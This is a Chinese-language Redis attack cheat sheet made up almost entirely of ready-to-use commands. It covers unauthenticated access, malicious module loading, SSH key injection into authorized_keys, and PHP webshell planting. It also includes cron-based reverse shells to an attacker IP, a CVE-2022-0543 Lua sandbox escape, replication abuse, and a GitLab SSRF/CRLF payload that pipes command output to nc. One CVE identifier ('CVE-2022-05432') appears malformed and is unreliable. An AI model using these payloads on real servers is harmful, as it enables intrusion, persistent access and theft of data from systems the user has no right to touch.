# Redis服务

1.自动枚举

```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```

2.banner

```Bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```

## 未授权访问

```Bash
redis-cli -h IP地址
INFO
KEYS *
EVAL "os.execute('id')" 0
CONFIG GET *
DEBUG SCRIPT LOAD "os.execute('id')"
```

## 利用配置文件

1.
```Bash
CONFIG SET dir /etc/
CONFIG GET *
```

2.
malicious_module.c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "redismodule.h"

int MaliciousCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    RedisModule_ReplyWithSimpleString(ctx, "Malicious code executed!");
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "malicious_module", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    if (RedisModule_CreateCommand(ctx, "malicious_command", MaliciousCommand, "write", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    return REDISMODULE_OK;
}
```

```Bash
gcc -shared -o malicious_module.so malicious_module.c -I /usr/share/metasploit-framework/data/exploits/redis/ -fPIC
cp malicious_module.so /etc/redis

redis
MODULE LOAD /etc/redis/malicious_module.so
malicious_command
```

[更多模块](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

3.
```Bash
redis-cli CONFIG SET notify-keyspace-events "Ex"
redis-cli PSUBSCRIBE "__key*__:*"
redis-cli ECHO "id > /tmp/output"
```

## 写入SSH公钥

```Bash
ssh-keygen -t rsa -b 2048 -f id_rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
cat foo.txt | redis-cli -h 目标服务器IP -x set ssh_key

redis
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

2.
```Bash
redis
SET "ssh:known_hosts" "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."
CONFIG SET dir /home/user/.ssh
EVAL "local f = io.open('/home/user/.ssh/authorized_keys', 'a+'); f:write('公钥'); f:close()" 0
```

## WebShell注入

1.
```Bash
CONFIG SET dir /usr/local/nginx/html/
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
SAVE
```

http://目标服务器IP/shell.php?cmd=id

2.
```Bash
redis-cli EVAL "local f = io.open('/var/www/html/shell.php', 'w+'); f:write('<?php system($_GET[\'cmd\']); ?>'); f:close()" 0
```

3.
```Bash
redis-cli CONFIG SET dir /var/www/html
redis-cli SET "webshell:php" "<?php system($_GET['cmd']); ?>"
SAVE
```

## 反弹Shell

1.
```Bash
nc -lvp 4444

redis
CONFIG SET dir /var/spool/cron/ or /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SET x "\n* * * * * /bin/bash -i >& /dev/tcp/攻击者IP/4444 0>&1\n"
SAVE
```

2.
```Bash
redis-cli EVAL "local s = redis.call('pubsub', 'channels', 'rebound'); local f = io.open('/tmp/rebound.sh', 'w+'); f:write('bash -i >& /dev/tcp/attacker_ip/8080 0>&1'); f:close()" 0
redis-cli PUBLISH rebound "rebound"
redis-cli SUBSCRIBE rebound
```

## Lua沙盒绕过

+ CVE-2022-05432
+ CVE-2022-0543

```Bash
EVAL "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id', 'r'); local res = f:read('*a'); f:close(); return res" 0
```

[cve-2022-0543](https://github.com/aodsec/CVE-2022-0543)

[http request redis](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)

## 主从模块

攻击者服务器连接目标服务器
```Bash
SLAVEOF 攻击者服务器IP 6379
```

攻击者服务器
```Bash
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET x "\n* * * * * /bin/bash -i >& /dev/tcp/攻击者IP/4444 0>&1\n"
SAVE

nc -lvvp 4444
```

## Gitlab SSRF + CRLF 到 Shell

```Bash
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```

```Bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
